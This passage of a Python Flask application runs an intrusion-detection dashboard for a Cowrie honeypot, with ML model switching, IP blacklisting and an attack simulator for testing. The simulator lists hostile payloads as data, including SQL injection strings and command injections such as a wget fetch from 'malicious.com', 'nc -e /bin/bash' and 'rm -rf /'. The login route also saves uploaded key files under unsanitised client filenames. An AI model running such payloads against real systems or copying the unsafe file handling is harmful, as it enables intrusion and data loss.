            incident['is_blacklisted'] = ip in ip_blacklist
        if not incident.get('model_name') and current_model:
            incident['model_name'] = current_model
        socketio.emit('new_incident', incident)
        if ids_engine:
            stats = ids_engine.get_stats()
            if 'model_info' not in stats:
                stats['model_info'] = {}
            stats['model_info']['name'] = current_model or stats.get('model_info', {}).get('name', 'Unknown')
            socketio.emit('stats_update', stats)
    except Exception as e:
        print(f"Error broadcasting: {e}")

# ─── IP Enrichment ────────────────────────────────────────────────────────────

class IPEnrichment:
    def __init__(self):
        self.cache = {}

    def get_country(self, ip: str) -> str:
        if ip in self.cache:
            return self.cache[ip]
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
            if response.status_code == 200:
                data = response.json()
                country = data.get('countryCode', 'Unknown') if data.get('status') == 'success' else 'Unknown'
            else:
                country = 'Unknown'
        except Exception as e:
            print(f"Error looking up {ip}: {e}")
            country = 'Unknown'
        self.cache[ip] = country
        return country

ip_enrichment = IPEnrichment()

# ─── Attack Simulator ─────────────────────────────────────────────────────────

class AttackSimulator:
    @staticmethod
    def simulate_ddos(count=100):
        base_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}"
        return [{'type':'ddos','src_ip':f"{base_ip}.{random.randint(1,254)}",
                 'dst_port':random.choice([80,443,8080]),'packet_count':random.randint(1000,10000),
                 'timestamp':datetime.now().isoformat()} for _ in range(count)]

    @staticmethod
    def simulate_sql_injection(count=10):
        payloads = ["' OR '1'='1","admin'--","' UNION SELECT NULL--","1' AND 1=1--","' DROP TABLE users--"]
        return [{'type':'sql_injection','src_ip':f"192.168.{random.randint(0,255)}.{random.randint(1,254)}",
                 'payload':random.choice(payloads),'target':'/login.php',
                 'timestamp':datetime.now().isoformat()} for _ in range(count)]

    @staticmethod
    def simulate_brute_force(count=50):
        usernames = ['admin','root','user','administrator','test']
        ip = f"172.16.{random.randint(0,255)}.{random.randint(1,254)}"
        return [{'type':'brute_force','src_ip':ip,'username':random.choice(usernames),
                 'password':f"pass{random.randint(1000,9999)}",'service':'ssh',
                 'timestamp':datetime.now().isoformat()} for _ in range(count)]

    @staticmethod
    def simulate_command_injection(count=15):
        commands = ['; cat /etc/passwd','| whoami','; rm -rf /','&& wget malicious.com/shell.sh','; nc -e /bin/bash']
        return [{'type':'command_injection',
                 'src_ip':f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                 'command':random.choice(commands),'target':'/api/exec',
                 'timestamp':datetime.now().isoformat()} for _ in range(count)]

    @staticmethod
    def simulate_malware_intrusion(count=20):
        malware_types = ['trojan','ransomware','backdoor','rootkit','worm']
        return [{'type':'malware_intrusion',
                 'src_ip':f"203.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                 'malware_type':random.choice(malware_types),
                 'file_hash':''.join(random.choices('abcdef0123456789',k=32)),
                 'timestamp':datetime.now().isoformat()} for _ in range(count)]

    @staticmethod
    def simulate_zero_day(count=5):
        return [{'type':'zero_day',
                 'src_ip':f"45.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                 'exploit':f"CVE-2024-{random.randint(10000,99999)}",
                 'target_service':random.choice(['apache','nginx','mysql','redis']),
                 'timestamp':datetime.now().isoformat()} for _ in range(count)]

# ─── Login HTML ───────────────────────────────────────────────────────────────

LOGIN_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>IDS Login</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{
            font-family:'Segoe UI',sans-serif;
            background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
            height:100vh; display:flex; justify-content:center;
            align-items:center; color:white;
        }}
        .container {{
            display:flex; width:850px; height:470px; border-radius:20px;
            overflow:hidden; box-shadow:0 20px 60px rgba(0,0,0,0.5);
        }}
        .left {{
            flex:1; background:linear-gradient(135deg,#00c6ff,#0072ff);
            display:flex; flex-direction:column; justify-content:center; padding:40px;
        }}
        .left h1 {{ font-size:32px; margin-bottom:10px; }}
        .left p {{ opacity:0.85; font-size:14px; margin-top:8px; line-height:1.6; }}
        .right {{
            flex:1; background:rgba(255,255,255,0.08); backdrop-filter:blur(20px);
            padding:40px; display:flex; flex-direction:column; justify-content:center;
        }}
        h2 {{ margin-bottom:20px; text-align:center; font-size:1.5em; }}
        input {{
            width:100%; padding:12px 15px; margin-top:12px; border-radius:10px;
            border:none; outline:none; background:rgba(255,255,255,0.15);
            color:white; font-size:0.95em;
        }}
        input::placeholder {{ color:rgba(255,255,255,0.6); }}
        input[type="file"] {{ padding:10px; cursor:pointer; }}
        button {{
            width:100%; margin-top:20px; padding:13px; border:none;
            border-radius:10px; background:linear-gradient(135deg,#00c6ff,#0072ff);
            color:white; font-weight:bold; font-size:1em; cursor:pointer; transition:0.3s;
        }}
        button:hover {{ transform:scale(1.03); box-shadow:0 0 18px rgba(0,198,255,0.5); }}
        .footer {{ text-align:center; margin-top:12px; font-size:12px; opacity:0.6; }}
        .error-msg {{
            background:rgba(239,68,68,0.2); border:1px solid #ef4444; color:#fca5a5;
            padding:10px 15px; border-radius:10px; margin-top:12px;
            text-align:center; font-size:0.9em;
        }}
    </style>
</head>
<body>
<div class="container">
    <div class="left">
        <h1>🛡 IDS Dashboard</h1>
        <p>Securely connect to your Cowrie Honeypot</p>
        <p>Real-time monitoring • AI-powered detection • Threat intelligence</p>
    </div>
    <div class="right">
        <h2>🔐 Connect Server</h2>
        <form method="POST" enctype="multipart/form-data">
            <input type="text" name="public_ip" placeholder="🌐 Public IP" required>
            <input type="text" name="username" placeholder="👤 Username" required>
            <input type="file" name="pem_file" accept=".pem" required>
            <button type="submit">🚀 Connect & Launch IDS</button>
        </form>
        {error}
        <div class="footer">Secure SSH Connection via PEM Key</div>
    </div>
</div>
</body>
</html>"""

# ─── Routes: Login / Logout / Connecting ─────────────────────────────────────

@app.route('/login', methods=['GET', 'POST'])
def login():
    if session.get('logged_in'):
        return redirect(url_for('index'))

    if request.method == 'POST':
        ip = request.form.get('public_ip')
        username = request.form.get('username')
        pem_file = request.files.get('pem_file')

        upload_folder = "temp_keys"
        os.makedirs(upload_folder, exist_ok=True)
        pem_path = os.path.join(upload_folder, pem_file.filename)
        pem_file.save(pem_path)

        success = test_cowrie_connection(ip, username, pem_path)
        if not success:
            error_html = '<div class="error-msg">❌ Connection Failed. Check IP / PEM / Instance.</div>'
            return LOGIN_HTML.format(error=error_html)

        session.permanent = False
        session['logged_in'] = True
        session['ip'] = ip
        session['username'] = username
        session['pem_path'] = pem_path

        threading.Thread(
            target=initialize_ids_with_login,
            args=(ip, username, pem_path),
            daemon=True
        ).start()

        return redirect(url_for('connecting'))

    return LOGIN_HTML.format(error='')


@app.route('/logout')
def logout():
    global ids_engine, initialization_complete, current_model
    if ids_engine:
        try:
            ids_engine.stop()
        except Exception:
            pass
    ids_engine = None
    initialization_complete = False
    current_model = None
    session.clear()
    # Use a hard redirect response so the browser fully navigates away
    response = redirect(url_for('login'))
    response.delete_cookie('session')
    return response


@app.route('/connecting')
@login_required
def connecting():
    return """<!DOCTYPE html>
<html>
<head>
<title>Connecting...</title>
<style>
  body { margin:0; background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
         height:100vh; display:flex; justify-content:center; align-items:center;
         font-family:'Segoe UI',sans-serif; color:white; flex-direction:column; gap:20px; }
  .spinner { width:60px; height:60px; border:6px solid rgba(255,255,255,0.1);
             border-top:6px solid #00c6ff; border-radius:50%; animation:spin 1s linear infinite; }
  @keyframes spin { to { transform:rotate(360deg); } }
</style>
<script>
  function checkReady() {
    fetch('/api/status')
      .then(r => r.json())
      .then(d => {
        if (d.initialized) { window.location.href = '/'; }
        else { setTimeout(checkReady, 1500); }
      })
      .catch(() => setTimeout(checkReady, 2000));
  }
  setTimeout(checkReady, 2000);
</script>
</head>
<body>
  <div class="spinner"></div>
  <div style="font-size:1.4em;font-weight:600;">🔗 Connecting to Honeypot...</div>
  <div style="color:rgba(255,255,255,0.6);font-size:0.95em;">Initializing IDS Engine, please wait</div>
</body>
</html>"""

# ─── Dashboard Route ──────────────────────────────────────────────────────────

@app.route('/')
@login_required
def index():
    from dashboard_html import DASHBOARD_HTML
    return render_template_string(DASHBOARD_HTML)

# ─── SocketIO Events ──────────────────────────────────────────────────────────

@socketio.on('connect')
def handle_connect():
    print('✓ Dashboard client connected')
    emit('status', {
        'status': 'connected',
        'initialized': initialization_complete,
        'current_model': current_model
    })
    if initialization_complete:
        emit('initialization_complete', {'status': 'ready', 'model': current_model})
    if ids_engine:
        stats = ids_engine.get_stats()
        if 'model_info' not in stats:
            stats['model_info'] = {}
        stats['model_info']['name'] = current_model
        emit('stats_update', stats)
        for inc in ids_engine.get_recent_incidents(20):
            emit('new_incident', inc)

@socketio.on('disconnect')
def handle_disconnect():
    print('✓ Dashboard client disconnected')

# ─── API Routes ───────────────────────────────────────────────────────────────

@app.route('/api/status')
@login_required
def get_status():
    return jsonify({
        'initialized': initialization_complete,
        'ids_active': ids_engine is not None,
        'current_model': current_model
    })


@app.route('/api/models')
@login_required
def get_available_models():
    return jsonify({
        "models": ["Random Forest","XGBoost","Decision Tree","KNN","Logistic Regression","LightGBM"],
        "current": current_model
    })


@app.route('/api/models/switch', methods=['POST'])
@login_required
def switch_model():
    global current_model
    data = request.get_json()
    model_name = data.get("model_name")

    if not ids_engine:
        return jsonify({"success": False, "error": "IDS not initialized"}), 503

    model_map = {
        "Random Forest": "random_forest",
        "XGBoost": "xgboost",
        "Decision Tree": "decision_tree",
        "KNN": "k-nearest_neighbors",
        "Logistic Regression": "logistic_regression",
        "LightGBM": "lightgbm"
    }

    if model_name not in model_map:
        return jsonify({"success": False, "error": "Unsupported model"}), 400

    model_path = os.path.join(MODEL_DIR, f"{model_map[model_name]}.pkl")
    if not os.path.exists(model_path):
        return jsonify({"success": False, "error": f"Model file missing: {model_path}"}), 500

    try:
        model = joblib.load(model_path)
        ids_engine.model = model
        if not hasattr(ids_engine, 'model_info'):
            ids_engine.model_info = {}
        ids_engine.model_info['name'] = model_name
        current_model = model_name
        if hasattr(ids_engine, '_current_model_name'):
            ids_engine._current_model_name = model_name

        model_performance_log.append({
            'timestamp': datetime.now().isoformat(),
            'model': model_name, 'action': 'switched'
        })

        socketio.emit("model_switched", {
            "model": model_name,
            "message": f"Successfully switched to {model_name}",
            "timestamp": datetime.now().isoformat()
        })

        stats = ids_engine.get_stats()
        stats['model_info']['name'] = model_name
        socketio.emit("stats_update", stats)

        return jsonify({"success": True, "model": model_name})

    except Exception as e:
        import traceback
        print(traceback.format_exc())
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/simulate/attack', methods=['POST'])
@login_required
def simulate_attack():
    data = request.get_json()
    attack_type = data.get('attack_type')
    count = data.get('count', 10)

    simulator = AttackSimulator()
    attack_map = {
        'ddos': simulator.simulate_ddos,
        'sql_injection': simulator.simulate_sql_injection,
        'brute_force': simulator.simulate_brute_force,
        'command_injection': simulator.simulate_command_injection,
        'malware_intrusion': simulator.simulate_malware_intrusion,
        'zero_day': simulator.simulate_zero_day,
    }

    fn = attack_map.get(attack_type)
    if not fn:
        return jsonify({'success': False, 'error': 'Unknown attack type'}), 400

    generated = fn(count)

    if ids_engine and hasattr(ids_engine, 'process_simulated_attack'):
        for attack in generated:
            ids_engine.process_simulated_attack(attack)

    socketio.emit('simulation_started', {
        'attack_type': attack_type, 'count': len(generated),
        'timestamp': datetime.now().isoformat()
    })

    return jsonify({'success': True, 'attack_type': attack_type,
                    'count': len(generated), 'attacks': generated[:5]})


@app.route('/api/blacklist', methods=['GET'])
@login_required
def get_blacklist():
    return jsonify({'blacklist': list(ip_blacklist), 'count': len(ip_blacklist)})


@app.route('/api/blacklist/add', methods=['POST'])
@login_required
def add_to_blacklist():
    ip = request.get_json().get('ip')
    if not ip:
        return jsonify({'success': False, 'error': 'IP required'}), 400
    ip_blacklist.add(ip)
    socketio.emit('blacklist_updated', {'action': 'added', 'ip': ip, 'count': len(ip_blacklist)})
    return jsonify({'success': True, 'ip': ip, 'count': len(ip_blacklist)})


@app.route('/api/blacklist/remove', methods=['POST'])
@login_required
def remove_from_blacklist():
    ip = request.get_json().get('ip')
    if ip in ip_blacklist:
        ip_blacklist.remove(ip)
        socketio.emit('blacklist_updated', {'action': 'removed', 'ip': ip, 'count': len(ip_blacklist)})
        return jsonify({'success': True, 'ip': ip, 'count': len(ip_blacklist)})
    return jsonify({'success': False, 'error': 'IP not in blacklist'}), 404


@app.route('/api/thresholds', methods=['GET'])
@login_required
def get_thresholds():
    return jsonify(alert_thresholds)


@app.route('/api/thresholds/update', methods=['POST'])
@login_required
def update_thresholds():
    data = request.get_json()
    if 'confidence' in data:
        alert_thresholds['confidence'] = float(data['confidence'])
    if 'severity' in data:
        alert_thresholds['severity'] = data['severity']
    if 'max_failed_logins' in data:
        alert_thresholds['max_failed_logins'] = int(data['max_failed_logins'])
    socketio.emit('thresholds_updated', alert_thresholds)
    return jsonify({'success': True, 'thresholds': alert_thresholds})


@app.route('/api/model/performance')
@login_required
def get_model_performance():
    if not ids_engine:
        return jsonify([])
    incidents = ids_engine.get_recent_incidents(500)
    model_stats = defaultdict(lambda: {'total': 0, 'high_confidence': 0, 'critical_severity': 0, 'avg_confidence': []})
    for inc in incidents:
        model = inc.get('model_name', current_model or 'Unknown')
        model_stats[model]['total'] += 1
        if inc.get('confidence', 0) > 0.9:
            model_stats[model]['high_confidence'] += 1
        if inc.get('severity') == 'Critical':
            model_stats[model]['critical_severity'] += 1
        model_stats[model]['avg_confidence'].append(inc.get('confidence', 0))
    result = []
    for model, stats in model_stats.items():
        avg_conf = sum(stats['avg_confidence']) / len(stats['avg_confidence']) if stats['avg_confidence'] else 0
        result.append({
            'model': model,
            'total_detections': stats['total'],
            'high_confidence_rate': (stats['high_confidence'] / stats['total'] * 100) if stats['total'] > 0 else 0,
            'critical_rate': (stats['critical_severity'] / stats['total'] * 100) if stats['total'] > 0 else 0,
            'avg_confidence': round(avg_conf * 100, 2)
        })
    return jsonify(result)


@app.route('/api/top/attackers')
@login_required
def get_top_attackers():
    if not ids_engine:
        return jsonify([])
    incidents = ids_engine.get_recent_incidents(500)
    ip_counts = defaultdict(lambda: {'count': 0, 'severity': defaultdict(int)})
    for inc in incidents:
        ip = inc.get('src_ip', 'Unknown')
        ip_counts[ip]['count'] += 1
        ip_counts[ip]['severity'][inc.get('severity', 'Low')] += 1
        if 'country' not in ip_counts[ip]:
            ip_counts[ip]['country'] = inc.get('country', 'Unknown')
    result = []
    for ip, data in sorted(ip_counts.items(), key=lambda x: x[1]['count'], reverse=True)[:10]:
        result.append({
            'ip': ip, 'count': data['count'], 'country': data['country'],
            'critical': data['severity'].get('Critical', 0),
            'high': data['severity'].get('High', 0),
            'is_blacklisted': ip in ip_blacklist
        })
    return jsonify(result)


@app.route('/api/stats')
@login_required
def get_stats():
    if ids_engine is None or not initialization_complete:
        return jsonify({
            'initialized': False, 'total_events': 0, 'attacks_detected': 0,
            'normal_sessions': 0, 'attack_rate': 0, 'unique_attackers': 0,
            'uptime': '0h 0m', 'events_per_minute': 0, 'model_name': 'Loading...',
            'model_accuracy': 0, 'model_f1': 0, 'avg_confidence': 0,
            'model_predictions': {'attack': 0, 'normal': 0}
        })

    stats = ids_engine.get_stats()
    if 'model_info' not in stats:
        stats['model_info'] = {}
    stats['model_info']['name'] = current_model or stats.get('model_info', {}).get('name', 'Unknown')

    uptime_seconds = stats.get('uptime_seconds', 0)
    events_per_minute = (stats['total_events'] / max(uptime_seconds / 60, 1)) if uptime_seconds > 0 else 0

    return jsonify({
        'initialized': True, **stats,
        'uptime': f"{int(uptime_seconds // 3600)}h {int((uptime_seconds % 3600) // 60)}m",
        'events_per_minute': round(events_per_minute, 2),
        'model_name': stats['model_info']['name'],
        'model_accuracy': round(stats.get('model_info', {}).get('accuracy', 0) * 100, 2),
        'model_f1': round(stats.get('model_info', {}).get('f1_score', 0) * 100, 2),
        'blacklist_count': len(ip_blacklist)
    })


@app.route('/api/incidents')
@login_required
def get_incidents():
    if ids_engine is None or not initialization_complete:
        return jsonify([])
    limit = request.args.get('limit', default=50, type=int)
    incidents = ids_engine.get_recent_incidents(limit)
    for incident in incidents:
        ip = incident.get('src_ip', '')
        if ip:
            incident['country'] = ip_enrichment.get_country(ip)
            incident['is_blacklisted'] = ip in ip_blacklist
        if not incident.get('model_name') and current_model:
            incident['model_name'] = current_model
    return jsonify(incidents)


@app.route('/api/attack_timeline')
@login_required
def get_attack_timeline():
    if ids_engine is None or not initialization_complete:
        return jsonify([])
    incidents = ids_engine.get_recent_incidents(200)
    timeline = defaultdict(int)
    for incident in incidents:
        try:
            ts = datetime.fromisoformat(incident['timestamp'].replace('Z', '+00:00'))
            timeline[ts.strftime('%Y-%m-%d %H:00')] += 1
        except:
            continue
    result = [{'time': k, 'count': v} for k, v in sorted(timeline.items())]
    return jsonify(result[-24:])


@app.route('/api/attack_types_distribution')
@login_required
def get_attack_types():
    if ids_engine is None or not initialization_complete:
        return jsonify([])
    stats = ids_engine.get_stats()
    return jsonify(sorted([{'type': k, 'count': v} for k, v in stats.get('attack_types', {}).items()],
                          key=lambda x: x['count'], reverse=True))


@app.route('/api/severity_distribution')
@login_required
def get_severity_distribution():
    if ids_engine is None or not initialization_complete:
        return jsonify([])
    stats = ids_engine.get_stats()
    return jsonify([{'severity': k, 'count': v} for k, v in stats.get('severity_counts', {}).items()])


@app.route('/api/confidence_distribution')
@login_required
def get_confidence_distribution():
    if ids_engine is None or not initialization_complete:
        return jsonify([])
    incidents = ids_engine.get_recent_incidents(200)
    buckets = {'90-100%': 0, '80-90%': 0, '70-80%': 0, '60-70%': 0, '<60%': 0}
    for incident in incidents:
        conf = incident.get('confidence', 0) * 100
        if conf >= 90: buckets['90-100%'] += 1
        elif conf >= 80: buckets['80-90%'] += 1
        elif conf >= 70: buckets['70-80%'] += 1
        elif conf >= 60: buckets['60-70%'] += 1
        else: buckets['<60%'] += 1
    return jsonify([{'range': k, 'count': v} for k, v in buckets.items()])


@app.route('/api/geo_distribution')
@login_required
def get_geo_distribution():
    if ids_engine is None or not initialization_complete:
        return jsonify([])
    incidents = ids_engine.get_recent_incidents(500)
    country_counts = defaultdict(int)
    for incident in incidents:
        ip = incident.get('src_ip', '')
        if ip:
            country_counts[ip_enrichment.get_country(ip)] += 1
    return jsonify(sorted([{'country': k, 'count': v} for k, v in country_counts.items()],
                          key=lambda x: x['count'], reverse=True))


@app.route('/api/export/csv')
@login_required
def export_csv():
    if ids_engine is None:
        return jsonify({'error': 'IDS not initialized'}), 503
    incidents = ids_engine.get_recent_incidents(1000)
    flat = [{'timestamp': i.get('timestamp'), 'src_ip': i.get('src_ip'),
             'attack_type': i.get('attack_type'), 'severity': i.get('severity'),
             'confidence': i.get('confidence'), 'model_name': i.get('model_name', current_model)}
            for i in incidents]
    df = pd.DataFrame(flat)
    output = io.StringIO()
    df.to_csv(output, index=False)
    output.seek(0)
    return send_file(
        io.BytesIO(output.getvalue().encode()),
        mimetype='text/csv', as_attachment=True,
        download_name=f'ids_advanced_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
    )

# ─── Main ─────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    # Background stats broadcaster — keeps dashboard live every 3s
    threading.Thread(target=stats_broadcast_loop, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)